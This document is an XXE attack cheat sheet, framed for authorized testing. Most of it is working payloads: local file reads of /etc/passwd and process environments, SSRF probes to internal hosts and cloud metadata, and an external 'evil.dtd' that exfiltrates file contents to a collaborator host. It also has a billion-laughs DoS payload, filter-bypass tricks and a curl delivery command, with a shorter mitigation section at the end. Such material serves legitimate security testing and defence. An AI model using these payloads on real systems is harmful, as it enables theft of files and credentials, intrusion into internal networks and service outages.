# 📄 XML External Entity (XXE) Cheat Sheet
> **Scope:** Authorized testing only. Test parsers you own or targets with explicit written permission. File reads and SSRF can touch internal systems — use harmless markers (`/etc/hostname`) and your own `<COLLAB>` endpoint.

---
## ⚡ Quick Reference
| Goal | Technique |
|------|-----------|
| Read local file | External general entity `file:///...` |
| SSRF / internal port | External entity `http://<INTERNAL_HOST>/<PATH>` |
| Blind exfiltration | External DTD + nested parameter entities → `<COLLAB>` |
| Error-based read | Force parser error containing entity value |
| DoS | Nested/billion laughs entities |
| Filter bypass | UTF-16, `PUBLIC`, parameter entities, wrappers |

---
## 🧩 Entity Types
| Type | Syntax | Notes |
|------|--------|-------|
| **Internal general** | `<!ENTITY name "value">` | Simple substitution |
| **External general** | `<!ENTITY xxe SYSTEM "file:///etc/hostname">` | Referenced as `&xxe;` |
| **External parameter** | `<!ENTITY % dtd SYSTEM "http://<COLLAB>/dtd">` | Usable only inside the DTD |
| **Predefined** | `&lt; &gt; &amp; &quot; &apos;` | Always available |
| **Character refs** | `&#65; &#x41;` | Can bypass naive filters |
| **Unparsed** | `<!ENTITY pic SYSTEM "..." NDATA jpeg>` | Not rendered in content |

> XXE requires a parser that resolves **external entities/DTDs**. SOAP, SAML, XML-RPC, SVG uploads, and `application/xml` APIs are common entry points.

---
## 📂 File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>
```

```http
POST /<PATH> HTTP/1.1
Host: <HOST>
Content-Type: application/xml

<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
```

| Platform | Paths / wrappers |
|----------|------------------|
| Linux | `file:///etc/passwd`, `file:///proc/self/environ` |
| Windows | `file:///C:/Windows/win.ini` |
| PHP | `php://filter/convert.base64-encode/resource=/var/www/html/<PATH>` |
| PHP | `expect://id` (only if `expect` is enabled) |
| Java | `file:///etc/passwd`, `jar:file:///opt/app/lib.jar!/config.xml` |
| .NET | `file:///C:/Windows/win.ini`, `http://<COLLAB>/` |

*Wrap file reads in `php://filter/convert.base64-encode/resource=<PATH>` when raw content breaks XML parsing (angle brackets, invalid UTF-8).*

---
## 🌐 SSRF Via Entities
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://<INTERNAL_HOST>/<PATH>">
]>
<root>&xxe;</root>
```

*Swap in `http://<COLLAB>/xxe-probe` for OOB confirmation. Cloud metadata endpoints, internal admin panels, and localhost are typical targets; use an in-scope stand-in (`<INTERNAL_HOST>`) in notes.*

---
## 👁️ Blind OOB Exfiltration (External DTD)
### Request to the vulnerable parser
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://<COLLAB>/evil.dtd">
  %dtd;
]>
<root>probe</root>
```

### `evil.dtd` hosted on your server
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<COLLAB>/?data=%file;'>">
%eval;
%exfil;
```

> `&#x25;` is an encoded `%` required inside nested parameter entity declarations. Keep the DTD **external** — many parsers forbid nesting in an internal subset. Collect exfiltrated data at `<COLLAB>` and redact it in reports.

### Error-based variant
Replace `exfil` above with an entity pointing at a nonexistent `file:///` path whose URL includes `%file;` — the parser error may echo the file contents.

---
## 💥 Billion Laughs (DoS — lab only)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

*Small expansion only; never run unbounded expansion on shared infrastructure.*

---
## 🧪 Filter Bypasses & Tips
| Blocked | Try |
|---------|-----|
| `SYSTEM` | `PUBLIC "-//x//" "file:///etc/passwd"` |
| `file://` | `php://filter/...`, `jar:file://...`, UNC `\\<HOST>\share` |
| XML detection | UTF-16 body, `text/xml` / `application/soap+xml` |
| Entity name blocklist | Random names, parameter entities `%xxe;` |
| No reflection | OOB DTD, error-based XXE |
| SVG upload | `<svg><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>` |

```bash
curl -sS -X POST https://<HOST>/<PATH> -H 'Content-Type: application/xml' --data-binary @payload.xml
```

---
## 💥 Impact
Confidential file disclosure (config, credentials, source) · SSRF to internal APIs/metadata · blind OOB exfiltration · entity-expansion DoS · rare local file write/RCE via wrappers such as `expect://`.

---
## 🛡️ Mitigation
- **Disable DTDs and external entities entirely** — the strongest fix.
  - Java: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`; external general/parameter entities `false`; enable `XMLConstants.FEATURE_SECURE_PROCESSING`.
  - .NET: `XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null }`.
  - PHP: `libxml_disable_entity_loader(true)` (legacy) / `LIBXML_NONET`; upgrade libxml ≥ 2.9.
  - Python `lxml`: `etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)`.
- Prefer **JSON** where XML is unnecessary; reject `DOCTYPE` in untrusted documents.
- Validate against a strict schema before processing.
- Restrict egress so parsers cannot reach internal hosts or metadata services.
- Keep XML libraries patched; disable dangerous wrappers such as PHP `expect://`.

---
## ✅ Testing Checklist
- [ ] Scope and authorization confirmed
- [ ] XML/SOAP/SAML/SVG entry points mapped
- [ ] Content-type and encoding variations tested
- [ ] Internal and external general entities tested
- [ ] PHP/Java/.NET wrappers tried where relevant
- [ ] SSRF probe to `<COLLAB>` / `<INTERNAL_HOST>` attempted
- [ ] Blind OOB DTD with `&#x25;` nesting prepared
- [ ] Error-based variant attempted; DoS limited to own lab
- [ ] No real secrets or flags stored in notes or reports

---
## 📚 References
- [OWASP — XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger — XXE injection](https://portswigger.net/web-security/xxe)
- [PortSwigger — Blind XXE with OOB interaction](https://portswigger.net/web-security/xxe/blind)
- [CWE-611 — Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)

---
**📄 Happy (authorized) XML hunting!**
